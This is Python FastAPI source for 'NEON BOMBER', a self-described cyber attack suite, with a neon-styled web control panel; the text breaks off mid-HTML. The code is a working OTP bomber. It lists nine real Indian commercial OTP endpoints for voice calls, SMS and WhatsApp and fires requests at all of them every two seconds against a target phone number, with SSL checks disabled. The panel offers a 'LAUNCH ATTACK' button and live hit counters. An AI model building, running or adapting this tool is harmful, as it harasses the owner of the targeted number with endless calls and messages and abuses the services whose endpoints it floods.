from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import asyncio
import aiohttp
import threading
from datetime import datetime
from pydantic import BaseModel

app = FastAPI()

class Phone(BaseModel):
    phone: str

# === YOUR FULL API LIST ===
ULTIMATE_APIS = [
    {"name": "Tata Capital Voice Call", "type": "Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "1MG Voice Call", "type": "Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "Swiggy Call Verification", "type": "Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Flipkart Voice Call", "type": "Call", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Zivame Voice Call", "type": "Call", "url": "https://api.zivame.com/v2/customer/login/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}","otp_type":"voice"}}'},
    {"name": "Lenskart SMS", "type": "SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "PharmEasy SMS", "type": "SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "ShipRocket SMS", "type": "SMS", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "KPN WhatsApp", "type": "WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'},
]

attack_status = {"running": False, "phone": None, "cycles": 0, "stats": {"Call": 0, "SMS": 0, "WhatsApp": 0}, "logs": []}

def add_log(msg):
    attack_status["logs"].insert(0, f"{datetime.now().strftime('%H:%M:%S')} - {msg}")
    if len(attack_status["logs"]) > 25:
        attack_status["logs"].pop()

async def hit_api(session, api, phone):
    try:
        data = api["data"](phone) if callable(api.get("data")) else None
        async with session.request(method=api["method"], url=api["url"], headers=api["headers"], data=data, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as resp:
            if resp.status in (200, 201, 202, 204):
                t = api.get("type", "SMS")
                attack_status["stats"][t] = attack_status["stats"].get(t, 0) + 1
    except:
        pass

async def run_attack(phone):
    global attack_status
    attack_status["running"] = True
    attack_status["phone"] = phone
    attack_status["cycles"] = 0
    attack_status["stats"] = {"Call": 0, "SMS": 0, "WhatsApp": 0}
    add_log(f"🚀 Attack initiated on +91{phone}")

    async with aiohttp.ClientSession() as session:
        while attack_status["running"]:
            attack_status["cycles"] += 1
            tasks = [hit_api(session, api, phone) for api in ULTIMATE_APIS]
            await asyncio.gather(*tasks, return_exceptions=True)
            add_log(f"⚡ Cycle {attack_status['cycles']} executed")
            await asyncio.sleep(2)
    add_log("🛑 Attack terminated")
    attack_status["running"] = False

@app.get("/", response_class=HTMLResponse)
async def index():
    html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ NEON BOMBER ⚡</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;800;900&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Orbitron', monospace;
            background: #000000;
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }

        /* ===== LIGHTNING BACKGROUND ===== */
        .lightning-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(ellipse at 20% 50%, rgba(255, 0, 50, 0.3) 0%, transparent 60%),
                radial-gradient(ellipse at 80% 50%, rgba(0, 50, 255, 0.3) 0%, transparent 60%),
                radial-gradient(ellipse at 50% 100%, rgba(150, 0, 255, 0.2) 0%, transparent 50%);
            z-index: 0;
            animation: pulseGlow 3s ease-in-out infinite alternate;
        }

        @keyframes pulseGlow {
            0% { opacity: 0.6; }
            100% { opacity: 1; }
        }

        /* ===== NEON GRID ===== */
        .neon-grid {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(255, 0, 100, 0.05) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 100, 255, 0.05) 1px, transparent 1px);
            background-size: 60px 60px;
            z-index: 0;
            animation: gridPulse 4s ease-in-out infinite;
        }

        @keyframes gridPulse {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 0.8; }
        }

        /* ===== LIGHTNING FLASHES ===== */
        .lightning-flash {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            z-index: 9999;
            opacity: 0;
            pointer-events: none;
            animation: lightning 8s infinite;
        }

        @keyframes lightning {
            0%, 89%, 91%, 100% { opacity: 0; }
            90% { opacity: 0.8; }
            90.5% { opacity: 0; }
            92% { opacity: 0.6; }
            92.5% { opacity: 0; }
        }

        /* ===== GLASS NEON ===== */
        .glass-neon {
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(30px) saturate(1.8);
            -webkit-backdrop-filter: blur(30px) saturate(1.8);
            border: 1px solid rgba(255, 0, 100, 0.2);
            box-shadow: 
                0 0 30px rgba(255, 0, 100, 0.1),
                inset 0 0 30px rgba(255, 0, 100, 0.05);
            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }

        .glass-neon::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, #ff0066, #00ccff, #ff0066, #00ccff);
            background-size: 400% 400%;
            z-index: -1;
            border-radius: inherit;
            animation: borderGlow 4s linear infinite;
            opacity: 0.3;
            filter: blur(2px);
        }

        @keyframes borderGlow {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .glass-neon:hover {
            border-color: rgba(255, 0, 100, 0.6);
            box-shadow: 
                0 0 60px rgba(255, 0, 100, 0.3),
                0 0 120px rgba(255, 0, 100, 0.1),
                inset 0 0 60px rgba(255, 0, 100, 0.05);
        }

        /* ===== NEON TEXT ===== */
        .neon-text {
            font-family: 'Orbitron', monospace;
            text-shadow: 
                0 0 10px rgba(255, 0, 100, 0.8),
                0 0 20px rgba(255, 0, 100, 0.6),
                0 0 40px rgba(255, 0, 100, 0.4),
                0 0 80px rgba(255, 0, 100, 0.2);
            animation: neonPulse 2s ease-in-out infinite;
        }

        @keyframes neonPulse {
            0%, 100% { text-shadow: 0 0 10px rgba(255, 0, 100, 0.8), 0 0 20px rgba(255, 0, 100, 0.6), 0 0 40px rgba(255, 0, 100, 0.4); }
            50% { text-shadow: 0 0 20px rgba(255, 0, 100, 1), 0 0 40px rgba(255, 0, 100, 0.8), 0 0 80px rgba(255, 0, 100, 0.6), 0 0 120px rgba(255, 0, 100, 0.4); }
        }

        .neon-text-cyan {
            text-shadow: 
                0 0 10px rgba(0, 200, 255, 0.8),
                0 0 20px rgba(0, 200, 255, 0.6),
                0 0 40px rgba(0, 200, 255, 0.4);
            animation: neonPulseCyan 2s ease-in-out infinite;
        }

        @keyframes neonPulseCyan {
            0%, 100% { text-shadow: 0 0 10px rgba(0, 200, 255, 0.8), 0 0 20px rgba(0, 200, 255, 0.6); }
            50% { text-shadow: 0 0 20px rgba(0, 200, 255, 1), 0 0 40px rgba(0, 200, 255, 0.8), 0 0 80px rgba(0, 200, 255, 0.6); }
        }

        .neon-text-purple {
            text-shadow: 
                0 0 10px rgba(150, 0, 255, 0.8),
                0 0 20px rgba(150, 0, 255, 0.6),
                0 0 40px rgba(150, 0, 255, 0.4);
            animation: neonPulsePurple 2s ease-in-out infinite;
        }

        @keyframes neonPulsePurple {
            0%, 100% { text-shadow: 0 0 10px rgba(150, 0, 255, 0.8), 0 0 20px rgba(150, 0, 255, 0.6); }
            50% { text-shadow: 0 0 20px rgba(150, 0, 255, 1), 0 0 40px rgba(150, 0, 255, 0.8), 0 0 80px rgba(150, 0, 255, 0.6); }
        }

        /* ===== STAT CARDS ===== */
        .stat-neon {
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid rgba(255, 0, 100, 0.2);
            box-shadow: 
                0 0 20px rgba(255, 0, 100, 0.1),
                inset 0 0 20px rgba(255, 0, 100, 0.05);
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }

        .stat-neon::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: conic-gradient(from 0deg, transparent, rgba(255, 0, 100, 0.05), transparent, rgba(0, 200, 255, 0.05), transparent);
            animation: rotateGlow 10s linear infinite;
        }

        @keyframes rotateGlow {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .stat-neon:hover {
            transform: translateY(-4px) scale(1.02);
            border-color: rgba(255, 0, 100, 0.6);
            box-shadow: 
                0 0 40px rgba(255, 0, 100, 0.3),
                0 0 80px rgba(255, 0, 100, 0.1);
        }

        /* ===== NEON INPUT ===== */
        .neon-input {
            background: rgba(0, 0, 0, 0.9);
            border: 2px solid rgba(255, 0, 100, 0.3);
            box-shadow: 
                0 0 20px rgba(255, 0, 100, 0.05),
                inset 0 0 20px rgba(255, 0, 100, 0.05);
            transition: all 0.4s ease;
            font-family: 'Orbitron', monospace;
            letter-spacing: 0.2em;
            color: #ff0066;
        }

        .neon-input:focus {
            border-color: #ff0066;
            box-shadow: 
                0 0 40px rgba(255, 0, 100, 0.3),
                0 0 80px rgba(255, 0, 100, 0.1),
                inset 0 0 40px rgba(255, 0, 100, 0.1);
            outline: none;
        }

        .neon-input::placeholder {
            color: rgba(255, 0, 100, 0.2);
            font-family: 'Orbitron', monospace;
            letter-spacing: 0.1em;
        }

        /* ===== NEON BUTTONS ===== */
        .btn-neon {
            background: linear-gradient(135deg, #ff0066, #cc0033);
            border: none;
            box-shadow: 
                0 0 30px rgba(255, 0, 100, 0.4),
                0 0 60px rgba(255, 0, 100, 0.2),
                inset 0 0 30px rgba(255, 255, 255, 0.1);
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
            font-family: 'Orbitron', monospace;
            text-transform: uppercase;
            letter-spacing: 0.1em;
        }

        .btn-neon::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
            transform: rotate(45deg);
            transition: all 0.6s;
        }

        .btn-neon:hover::before {
            transform: rotate(45deg) translate(50%, 50%);
        }

        .btn-neon:hover {
            transform: translateY(-3px) scale(1.02);
            box-shadow: 
                0 0 60px rgba(255, 0, 100, 0.6),
                0 0 120px rgba(255, 0, 100, 0.3),
                inset 0 0 60px rgba(255, 255, 255, 0.1);
        }

        .btn-neon:active {
            transform: scale(0.98);
        }

        .btn-neon-stop {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 0, 100, 0.3);
            box-shadow: 0 0 20px rgba(255, 0, 100, 0.1);
            font-family: 'Orbitron', monospace;
            text-transform: uppercase;
            letter-spacing: 0.1em;
            transition: all 0.4s ease;
        }

        .btn-neon-stop:hover {
            background: rgba(255, 0, 100, 0.2);
            border-color: #ff0066;
            box-shadow: 0 0 40px rgba(255, 0, 100, 0.3);
            transform: translateY(-3px);
        }

        /* ===== PROGRESS BARS ===== */
        .neon-progress {
            height: 4px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            overflow: hidden;
            position: relative;
            box-shadow: inset 0 0 10px rgba(255, 0, 100, 0.1);
        }

        .neon-progress-fill {
            height: 100%;
            border-radius: 10px;
            transition: width 0.8s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            box-shadow: 0 0 20px currentColor;
        }

        .neon-progress-fill::after {
            content: '';
            position: absolute;
            right: 0;
            top: -50%;
            width: 30px;
            height: 200%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
            animation: progressNeon 2s ease-in-out infinite;
        }

        @keyframes progressNeon {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(200%); }
        }

        /* ===== LOGS ===== */
        .neon-logs {
            font-family: 'Orbitron', monospace;
            scrollbar-width: thin;
            scrollbar-color: #ff0066 transparent;
            font-size: 11px;
        }

        .neon-logs::-webkit-scrollbar {
            width: 4px;
        }

        .neon-logs::-webkit-scrollbar-track {
            background: transparent;
        }

        .neon-logs::-webkit-scrollbar-thumb {
            background: linear-gradient(180deg, #ff0066, #00ccff);
            border-radius: 10px;
            box-shadow: 0 0 20px #ff0066;
        }

        .log-neon {
            padding: 6px 12px;
            border-radius: 6px;
            transition: all 0.3s;
            border-left: 2px solid transparent;
            animation: logGlow 0.5s ease-out;
        }

        .log-neon:hover {
            background: rgba(255, 0, 100, 0.05);
            border-left-color: #ff0066;
            box-shadow: 0 0 20px rgba(255, 0, 100, 0.05);
        }

        @keyframes logGlow {
            from {
                opacity: 0;
                transform: translateX(-20px);
                filter: blur(5px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
                filter: blur(0);
            }
        }

        /* ===== STATUS INDICATOR ===== */
        .neon-status {
            display: inline-flex;
            align-items: center;
            gap: 10px;
            padding: 10px 20px;
            border-radius: 100px;
            font-family: 'Orbitron', monospace;
            font-size: 12px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.1em;
            border: 1px solid rgba(255, 0, 100, 0.2);
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(10px);
        }

        .neon-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            display: inline-block;
            box-shadow: 0 0 20px currentColor;
            animation: dotPulse 1.5s ease-in-out infinite;
        }

        @keyframes dotPulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.3; transform: scale(0.7); }
        }

        .neon-dot.idle {
            background: #00ff88;
            color: #00ff88;
        }

        .neon-dot.active {
            background: #ff0066;
            color: #ff0066;
            animation: dotPulse 0.5s ease-in-out infinite;
        }

        /* ===== FLOATING PARTICLES ===== */
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
            overflow: hidden;
        }

        .particle {
            position: absolute;
            width: 2px;
            height: 2px;
            background: #ff0066;
            border-radius: 50%;
            box-shadow: 0 0 10px #ff0066, 0 0 20px #ff0066;
            animation: floatParticle 20s linear infinite;
        }

        @keyframes floatParticle {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(-10vh) rotate(720deg); opacity: 0; }
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 768px) {
            .glass-neon {
                backdrop-filter: blur(20px);
                -webkit-backdrop-filter: blur(20px);
            }
            
            .neon-text {
                font-size: 1.5rem !important;
            }
            
            .stat-neon {
                padding: 12px !important;
            }
        }
    </style>
</head>
<body>
    <!-- Lightning Flash -->
    <div class="lightning-flash"></div>

    <!-- Background Layers -->
    <div class="lightning-bg"></div>
    <div class="neon-grid"></div>

    <!-- Particles -->
    <div class="particles" id="particles"></div>

    <div class="relative z-10 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-10">
        <!-- Header -->
        <header class="flex flex-col lg:flex-row justify-between items-start lg:items-center gap-6 mb-10">
            <div class="flex items-center gap-6">
                <div class="relative">
                    <div class="w-16 h-16 lg:w-20 lg:h-20 rounded-2xl flex items-center justify-center text-4xl"
                         style="background: linear-gradient(135deg, #ff0066, #cc0033);
                                box-shadow: 0 0 40px rgba(255, 0, 100, 0.4), 0 0 80px rgba(255, 0, 100, 0.2);
                                animation: pulse-ring 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;">
                        ⚡
                    </div>
                    <div class="absolute -bottom-1 -right-1 w-5 h-5 bg-emerald-400 rounded-full border-2 border-black"
                         style="box-shadow: 0 0 30px rgba(0, 255, 136, 0.6);"></div>
                </div>
                <div>
                    <h1 class="text-3xl lg:text-6xl font-black neon-text tracking-wider">
                        NEON BOMBER
                    </h1>
                    <p class="text-sm lg:text-base font-bold tracking-[0.3em] text-gray-400 mt-1 flex items-center gap-3">
                        <span class="text-pink-500">✦</span>
                        CYBER ATTACK SUITE
                        <span class="text-pink-500">✦</span>
                        v3.0
                    </p>
                </div>
            </div>
            
            <div class="flex items-center gap-4">
                <div class="neon-status">
                    <span class="neon-dot idle" id="statusDot"></span>
                    <span id="statusText" class="text-gray-400">SYSTEM READY</span>
                </div>
                <div class="hidden lg:block w-px h-10 bg-gradient-to-b from-transparent via-pink-500 to-transparent"></div>
                <div class="text-xs text-pink-500 font-mono" id="timestamp" 
                     style="text-shadow: 0 0 20px rgba(255, 0, 100, 0.3);"></div>
            </div>
        </header>

        <!-- Main Grid -->
        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
            <!-- Control Panel -->
            <div class="lg:col-span-5 glass-neon rounded-3xl p-6 lg:p-8">
                <div class="flex items-center justify-between mb-6">
                    <h2 class="text-lg font-bold neon-text-cyan tracking-wider flex items-center gap-2">
                        <span>🎯</span> 
                        TARGET LOCK
                    </h2>
                    <span class="text-[10px] text-pink-500 font-bold tracking-widest bg-pink-500/10 px-4 py-2 rounded-full border border-pink-500/20"
                          style="text-shadow: 0 0 20px rgba(255, 0, 100, 0.3);">
                        ⚡ SECURE ⚡
                    </span>
                </div>
                
                <div class="space-y-6">
                    <div>
                        <label class="text-xs text-pink-400 font-bold tracking-widest block mb-2"
                               style="text-shadow: 0 0 20px rgba(255, 0, 100, 0.3);">
                            MOBILE NUMBER
                        </label>
                        <div class="relative">
                            <div class="absolute left-4 top-1/2 -translate-y-1/2 text-pink-500 font-bold text-sm tracking-wider"
                                 style="text-shadow: 0 0 20px rgba(255, 0, 100, 0.3);">+91</div>
                            <input id="phone" maxlength="10" 
                                   class="neon-input w-full rounded-2xl px-16 py-5 text-2xl lg:text-3xl font-bold outline-none transition-all"
                                   placeholder="ENTER NUMBER"
                                   oninput="this.value=this.value.replace(/[^0-9]/g,'')">
                        </div>
                        <p class="text-[10px] text-pink-500/50 mt-2 tracking-widest flex items-center gap-1">
                            <span>⚡</span> 10-DIGIT INDIAN MOBILE
                        </p>
                    </div>

                    <div class="grid grid-cols-2 gap-3">
                        <button onclick="startAttack()" id="startBtn" 
                                class="col-span-2 btn-neon py-5 rounded-2xl text-base font-bold flex items-center justify-center gap-3 transition-all">
                            <span>🚀</span> 
                            <span>LAUNCH ATTACK</span>
                        </button>
                        <button onclick="stopAttack()" id="stopBtn" 
                                class="col-span-2 hidden btn-neon-stop py-5 rounded-2xl text-base font-bold flex items-center justify-center gap-3 transition-all">
                            <span>🛑</span> 
                            <span>TERMINATE</span>
                        </button>
                    </div>

                    <div class="grid grid-cols-3 gap-3 p-4 bg-black/60 rounded-2xl border border-pink-500/10"
                         style="box-shadow: inset 0 0 30px rgba(255, 0, 100, 0.05);">
                        <div class="text-center">
                            <div class="text-[10px] text-pink-500/50 tracking-widest">APIS</div>
                            <div class="text-lg font-bold text-pink-400" style="text-shadow: 0 0 20px rgba(255, 0, 100, 0.3);">9</div>
                        </div>
                        <div class="text-center">
                            <div class="text-[10px] text-pink-500/50 tracking-widest">INTERVAL</div>
                            <div class="text-lg font-bold text-cyan-400" style="text-shadow: 0 0 20px rgba(0, 200, 255, 0.3);">2s</div>
                        </div>
                        <div class="text-center">
                            <div class="text-[10px] text-pink-500/50 tracking-widest">TARGET</div>
                            <div class="text-lg font-bold text-pink-400 truncate" id="targetDisplay" 
                                 style="text-shadow: 0 0 20px rgba(255, 0, 100, 0.3);">—</div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Stats Panel -->
            <div class="lg:col-span-7 glass-neon rounded-3xl p-6 lg:p-8">
                <div class="flex items-center justify-between mb-6">
                    <h3 class="text-lg font-bold neon-text-purple tracking-wider flex items-center gap-2">
                        <span>📊</span>
                        LIVE METRICS
                    </h3>
                    <span class="text-xs text-cyan-400 font-bold tracking-widest" 
                          style="text-shadow: 0 0 20px rgba(0, 200, 255, 0.3);" 
                          id="cycleDisplay">CYCLES: 0</span>
                </div>

                <div class="grid grid-cols-3 gap-4">
                    <div class="stat-neon rounded-2xl p-5 text-center">
                        <div class="text-4xl lg:text-5xl font-black text-pink-400 number-display" 
                             style="text-shadow: 0 0 30px rgba(255, 0, 100, 0.4);" id="calls">0</div>
                        <div class="text-[10px] text-gray-400 mt-2 font-bold tracking-widest">📞 VOICE</div>
                        <div class="neon-progress mt-3">
                            <div class="neon-progress-fill bg-gradient-to-r from-pink-500 to-pink-400" 
                                 id="callBar" style="width: 0%; color: #ff0066;"></div>
                        </div>
                    </div>
                    <div class="stat-neon rounded-2xl p-5 text-center">
                        <div class="text-4xl lg:text-5xl font-black text-cyan-400 number-display" 
                             style="text-shadow: 0 0 30px rgba(0, 200, 255, 0.4);" id="sms">0</div>
                        <div class="text-[10px] text-gray-400 mt-2 font-bold tracking-widest">✉️ SMS</div>
                        <div class="neon-progress mt-3">
                            <div class="neon-progress-fill bg-gradient-to-r from-cyan-500 to-cyan-400" 
                                 id="smsBar" style="width: 0%; color: #00ccff;"></div>
                        </div>
                    </div>
                    <div class="stat-neon rounded-2xl p-5 text-center">
                        <div class="text-4xl lg:text-5xl font-black text-purple-400 number-display" 
                             style="text-shadow: 0 0 30px rgba(150, 0, 255, 0.4);" id="wa">0</div>
                        <div class="text-[10px] text-gray-400 mt-2 font-bold tracking-widest">💬 WA</div>
                        <div class="neon-progress mt-3">
                            <div class="neon-progress-fill bg-gradient-to-r from-purple-500 to-purple-400" 
                                 id="waBar" style="width
